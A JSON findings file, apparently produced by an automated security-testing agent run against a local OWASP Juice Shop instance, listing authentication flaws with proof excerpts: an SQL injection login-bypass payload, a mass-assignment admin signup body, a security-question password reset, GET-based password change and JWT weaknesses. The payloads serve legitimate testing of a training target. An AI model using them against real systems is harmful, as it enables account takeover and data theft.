@@ -1,0 +1,374 @@
+{
+  "ok": true,
+  "summary": "Login/session behavior fully characterized. Multiple authentication vulnerabilities identified including SQL injection login bypass, mass assignment admin registration, weak password reset with exposed security questions, CSRF-vulnerable GET-based password change, non-expiring JWT tokens containing sensitive data, no logout endpoint, and insecure direct object references in basket API. Auth issues have proof_excerpt candidates with verbatim tool output.",
+  "summaryProvided": true,
+  "candidates": [
+    {
+      "title": "SQL Injection in Login - Authentication Bypass",
+      "location": "POST http://127.0.0.1:3010/rest/user/login",
+      "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+      "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+    },
+    {
+      "title": "Mass Assignment - Admin Registration",
+      "location": "POST http://127.0.0.1:3010/api/Users",
+      "proof_excerpt": "POST with {\"email\":\"massadmin@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin without authentication.",
+      "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+    },
+    {
+      "title": "Weak Captcha - Answer Exposed in Response",
+      "location": "GET http://127.0.0.1:3010/rest/captcha",
+      "proof_excerpt": "GET /rest/captcha returned {\"captchaId\":0,\"captcha\":\"1+3+3\",\"answer\":\"7\"} exposing the answer directly in the response, allowing automated captcha bypass.",
+      "poc_hint": "Captcha answer is returned alongside the question, easily bypassed"
+    },
+    {
+      "title": "Security Question Exposed for Any User",
+      "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
+      "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} leaking security questions for any email without authentication.",
+      "poc_hint": "Leaks security question for any email, aiding brute-force password reset"
+    },
+    {
+      "title": "Password Reset via Security Question - Bjoern's Account",
+      "location": "POST http://127.0.0.1:3010/rest/user/reset-password",
+      "proof_excerpt": "POST with {\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\",\"new\":\"test123\",\"repeat\":\"test123\"} returned 200 with user data including password hash, proving password reset with known security answer works.",
+      "poc_hint": "Security question answer 'Zaya' for bjoern@owasp.org enables password reset (OSINT challenge)"
+    },
+    {
+      "title": "Password Change via GET Request (CSRF)",
+      "location": "GET http://127.0.0.1:3010/rest/user/change-password",
+      "proof_excerpt": "GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object containing new password hash, proving password can be changed via GET request (CSRF vulnerable).",
+      "poc_hint": "Password change via GET query parameters - no CSRF token required"
+    },
+    {
+      "title": "JWT Token Contains Sensitive Data (Password Hash)",
+      "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+      "proof_excerpt": "Decoded JWT payload: {\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} - JWT token exposes password hash and role in plaintext.",
+      "poc_hint": "JWT token decodes to reveal password hashes, roles, and other sensitive user data"
+    },
+    {
+      "title": "JWT Token Has No Expiration",
+      "location": "JWT token analysis",
+      "proof_excerpt": "JWT payload contains only \"iat\":1784853679 (issued at) with no \"exp\" claim, meaning tokens never expire and remain valid indefinitely.",
+      "poc_hint": "Tokens have no expiry - stolen tokens can be used forever"
+    },
+    {
+      "title": "No Logout Endpoint - Token Cannot Be Invalidated",
+      "location": "POST/GET http://127.0.0.1:3010/rest/user/logout",
+      "proof_excerpt": "POST /rest/user/logout returned 500 \"Unexpected path: /rest/user/logout\" - no server-side logout mechanism exists; tokens cannot be invalidated after compromise.",
+      "poc_hint": "No logout functionality - tokens remain valid forever"
+    },
+    {
+      "title": "Excessive Data Exposure - User API",
+      "location": "GET http://127.0.0.1:3010/api/Users",
+      "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for all users.",
+      "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
+    },
+    {
+      "title": "Insecure Direct Object Reference - BasketItems API",
+      "location": "GET http://127.0.0.1:3010/api/BasketItems",
+      "proof_excerpt": "GET /api/BasketItems with any valid JWT returned all basket items for all users including BasketId 1 through 5, showing no access control filtering by user's own basket.",
+      "poc_hint": "Any authenticated user can view all users' shopping baskets via /api/BasketItems"
+    },
+    {
+      "title": "Weak Password Hashing - MD5 Used",
+      "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+      "proof_excerpt": "JWT payload shows password hash \"0192023a7bbd73250516f069df18b500\" which is MD5('admin123') - known weak hash that reverses instantly.",
+      "poc_hint": "Passwords hashed with MD5 - easily cracked"
+    }
+  ],
+  "surfaces": [
+    {
+      "location": "http://127.0.0.1:3010/"
+    },
+    {
+      "location": "http://127.0.0.1:3010/ftp/"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/products/search"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/user/login"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/user/change-password"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/user/reset-password"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/user/security-question"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/user/whoami"
+    },
+    {
+      "location": "http://127.0.0.1:3010/rest/captcha"
+    },
+    {
+      "location": "http://127.0.0.1:3010/api/Users"
+    },
+    {
+      "location": "http://127.0.0.1:3010/api/Challenges"
+    },
+    {
+      "location": "http://127.0.0.1:3010/api/Feedbacks"
+    },
+    {
+      "location": "http://127.0.0.1:3010/api/Products"
+    },
+    {
+      "location": "http://127.0.0.1:3010/api/BasketItems"
+    },
+    {
+      "location": "http://127.0.0.1:3010/.well-known/security.txt"
+    },
+    {
+      "location": "http://127.0.0.1:3010/robots.txt"
+    },
+    {
+      "location": "http://127.0.0.1:3010/redirect"
+    }
+  ],
+  "facts": [
+    {
+      "summary": "Login endpoint at /rest/user/login accepts JSON POST with email/password fields"
+    },
+    {
+      "summary": "SQL injection in email field with ' OR 1=1-- bypasses authentication and returns admin JWT"
+    },
+    {
+      "summary": "Registration at /api/Users accepts JSON POST and allows setting role=admin via mass assignment"
+    },
+    {
+      "summary": "Password change operates via GET request with query parameters (current, new, repeat)"
+    },
+    {
+      "summary": "Password reset via POST /rest/user/reset-password requires email, answer, new, repeat"
+    },
+    {
+      "summary": "Security question for any email can be retrieved via GET /rest/user/security-question?email="
+    },
+    {
+      "summary": "Admin security question: 'Mother's maiden name?'"
+    },
+    {
+      "summary": "Bjoern's security question: 'Name of your favorite pet?' with answer 'Zaya'"
+    },
+    {
+      "summary": "Captcha at /rest/captcha returns answer in response body (math question)"
+    },
+    {
+      "summary": "JWT uses RS256 algorithm, no exp claim, tokens never expire"
+    },
+    {
+      "summary": "JWT contains password hash, role, email, and other sensitive user data in payload"
+    },
+    {
+      "summary": "Dual auth methods supported: Authorization Bearer header and token cookie"
+    },
+    {
+      "summary": "No logout endpoint exists - token-based sessions cannot be invalidated server-side"
+    },
+    {
+      "summary": "Login endpoint shows no rate limiting headers"
+    },
+    {
+      "summary": "Reset-password endpoint shows rate limiting (x-ratelimit-limit: 100)"
+    },
+    {
+      "summary": "/api/Challenges publicly accessible without authentication"
+    },
+    {
+      "summary": "/api/Feedbacks publicly accessible without authentication"
+    },
+    {
+      "summary": "/api/BasketItems accessible with any valid JWT showing all users' basket data"
+    },
+    {
+      "summary": "Password hashes use MD5 - easily reversible"
+    },
+    {
+      "summary": "OAuth/social login endpoints not found (/rest/user/oauth returns 500)"
+    }
+  ],
+  "deadends": [
+    "POST /rest/user/change-password - Unexpected path error (500) - only GET requests work for password change",
+    "/rest/user/logout - Unexpected path error (500) - no logout endpoint exists",
+    "/rest/user/oauth - Unexpected path error (500) - OAuth endpoint not implemented",
+    "/rest/user/forgot-password - Unexpected path error (500) - different path needed",
+    "/api/SecurityAnswers - 401 Unauthorized - requires different authorization context",
+    "/api/Baskets - Unexpected path error (500) - API endpoint doesn't exist at this path",
+    "/api/SecurityQuestions - 500 syntax error - API exposed but malformed request causes error",
+    "JWT alg:none attack - rejected by server (RS256 properly validated)",
+    "JWT HS256 empty-key attack - rejected by server (RS256 properly validated)",
+    "Password change via POST with JSON body - Unexpected path (500)",
+    "Password change via POST with form data - Unexpected path (500)"
+  ],
+  "artifacts": [],
+  "raw": {
+    "ok": true,
+    "summary": "Login/session behavior fully characterized. Multiple authentication vulnerabilities identified including SQL injection login bypass, mass assignment admin registration, weak password reset with exposed security questions, CSRF-vulnerable GET-based password change, non-expiring JWT tokens containing sensitive data, no logout endpoint, and insecure direct object references in basket API. Auth issues have proof_excerpt candidates with verbatim tool output.",
+    "surfaces": [
+      {
+        "location": "http://127.0.0.1:3010/"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/search"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/login"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/change-password"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/reset-password"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/security-question"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/whoami"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/captcha"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Challenges"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Feedbacks"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Products"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/BasketItems"
+      },
+      {
+        "location": "http://127.0.0.1:3010/.well-known/security.txt"
+      },
+      {
+        "location": "http://127.0.0.1:3010/robots.txt"
+      },
+      {
+        "location": "http://127.0.0.1:3010/redirect"
+      }
+    ],
+    "candidates": [
+      {
+        "title": "SQL Injection in Login - Authentication Bypass",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+        "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+      },
+      {
+        "title": "Mass Assignment - Admin Registration",
+        "location": "POST http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "POST with {\"email\":\"massadmin@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\", proving mass assignment allows registering as admin without authentication.",
+        "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account"
+      },
+      {
+        "title": "Weak Captcha - Answer Exposed in Response",
+        "location": "GET http://127.0.0.1:3010/rest/captcha",
+        "proof_excerpt": "GET /rest/captcha returned {\"captchaId\":0,\"captcha\":\"1+3+3\",\"answer\":\"7\"} exposing the answer directly in the response, allowing automated captcha bypass.",
+        "poc_hint": "Captcha answer is returned alongside the question, easily bypassed"
+      },
+      {
+        "title": "Security Question Exposed for Any User",
+        "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
+        "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} leaking security questions for any email without authentication.",
+        "poc_hint": "Leaks security question for any email, aiding brute-force password reset"
+      },
+      {
+        "title": "Password Reset via Security Question - Bjoern's Account",
+        "location": "POST http://127.0.0.1:3010/rest/user/reset-password",
+        "proof_excerpt": "POST with {\"email\":\"bjoern@owasp.org\",\"answer\":\"Zaya\",\"new\":\"test123\",\"repeat\":\"test123\"} returned 200 with user data including password hash, proving password reset with known security answer works.",
+        "poc_hint": "Security question answer 'Zaya' for bjoern@owasp.org enables password reset (OSINT challenge)"
+      },
+      {
+        "title": "Password Change via GET Request (CSRF)",
+        "location": "GET http://127.0.0.1:3010/rest/user/change-password",
+        "proof_excerpt": "GET /rest/user/change-password?current=admin123&new=newpass&repeat=newpass with Authorization header returned 200 with updated user object containing new password hash, proving password can be changed via GET request (CSRF vulnerable).",
+        "poc_hint": "Password change via GET query parameters - no CSRF token required"
+      },
+      {
+        "title": "JWT Token Contains Sensitive Data (Password Hash)",
+        "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+        "proof_excerpt": "Decoded JWT payload: {\"data\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} - JWT token exposes password hash and role in plaintext.",
+        "poc_hint": "JWT token decodes to reveal password hashes, roles, and other sensitive user data"
+      },
+      {
+        "title": "JWT Token Has No Expiration",
+        "location": "JWT token analysis",
+        "proof_excerpt": "JWT payload contains only \"iat\":1784853679 (issued at) with no \"exp\" claim, meaning tokens never expire and remain valid indefinitely.",
+        "poc_hint": "Tokens have no expiry - stolen tokens can be used forever"
+      },
+      {
+        "title": "No Logout Endpoint - Token Cannot Be Invalidated",
+        "location": "POST/GET http://127.0.0.1:3010/rest/user/logout",
+        "proof_excerpt": "POST /rest/user/logout returned 500 \"Unexpected path: /rest/user/logout\" - no server-side logout mechanism exists; tokens cannot be invalidated after compromise.",
+        "poc_hint": "No logout functionality - tokens remain valid forever"
+      },
+      {
+        "title": "Excessive Data Exposure - User API",
+        "location": "GET http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "GET /api/Users with admin JWT returned all users including password hashes (e.g. \"password\":\"0192023a7bbd73250516f069df18b500\"), email addresses, roles, and other PII for all users.",
+        "poc_hint": "Authenticate as admin via SQLi login bypass then access /api/Users"
+      },
+      {
+        "title": "Insecure Direct Object Reference - BasketItems API",
+        "location": "GET http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "GET /api/BasketItems with any valid JWT returned all basket items for all users including BasketId 1 through 5, showing no access control filtering by user's own basket.",
+        "poc_hint": "Any authenticated user can view all users' shopping baskets via /api/BasketItems"
+      },
+      {
+        "title": "Weak Password Hashing - MD5 Used",
+        "location": "POST http://127.0.0.1:3010/rest/user/login (JWT payload)",
+        "proof_excerpt": "JWT payload shows password hash \"0192023a7bbd73250516f069df18b500\" which is MD5('admin123') - known weak hash that reverses instantly.",
+        "poc_hint": "Passwords hashed with MD5 - easily cracked"
+      }
+    ],
+    "facts": [
+      "Login endpoint at /rest/user/login accepts JSON POST with email/password fields",
+      "SQL injection in email field with ' OR 1=1-- bypasses authentication and returns admin JWT",
+      "Registration at /api/Users accepts JSON POST and allows setting role=admin via mass assignment",
+      "Password change operates via GET request with query parameters (current, new, repeat)",
+      "Password reset via POST /rest/user/reset-password requires email, answer, new, repeat",
+      "Security question for any email can be retrieved via GET /rest/user/security-question?email=",
+      "Admin security question: 'Mother's maiden name?'",
+      "Bjoern's security question: 'Name of your favorite pet?' with answer 'Zaya'",
+      "Captcha at /rest/captcha returns answer in response body (math question)",
+      "JWT uses RS256 algorithm, no exp claim, tokens never expire",
+      "JWT contains password hash, role, email, and other sensitive user data in payload",
+      "Dual auth methods supported: Authorization Bearer header and token cookie",
+      "No logout endpoint exists - token-based sessions cannot be invalidated server-side",
+      "Login endpoint shows no rate limiting headers",
+      "Reset-password endpoint shows rate limiting (x-ratelimit-limit: 100)",
+      "/api/Challenges publicly accessible without authentication",
+      "/api/Feedbacks publicly accessible without authentication",
+      "/api/BasketItems accessible with any valid JWT showing all users' basket data",
+      "Password hashes use MD5 - easily reversible",
+      "OAuth/social login endpoints not found (/rest/user/oauth returns 500)"
+    ],
+    "deadends": [
+      "POST /rest/user/change-password - Unexpected path error (500) - only GET requests work for password change",
+      "/rest/user/logout - Unexpected path error (500) - no logout endpoint exists",
+      "/rest/user/oauth - Unexpected path error (500) - OAuth endpoint not implemented",
+      "/rest/user/forgot-password - Unexpected path error (500) - different path needed",
+      "/api/SecurityAnswers - 401 Unauthorized - requires different authorization context",
+      "/api/Baskets - Unexpected path error (500) - API endpoint doesn't exist at this path",
+      "/api/SecurityQuestions - 500 syntax error - API exposed but malformed request causes error",
+      "JWT alg:none attack - rejected by server (RS256 properly validated)",
+      "JWT HS256 empty-key attack - rejected by server (RS256 properly validated)",
+      "Password change via POST with JSON body - Unexpected path (500)",
+      "Password change via POST with form data - Unexpected path (500)"
+    ]
+  }
+}
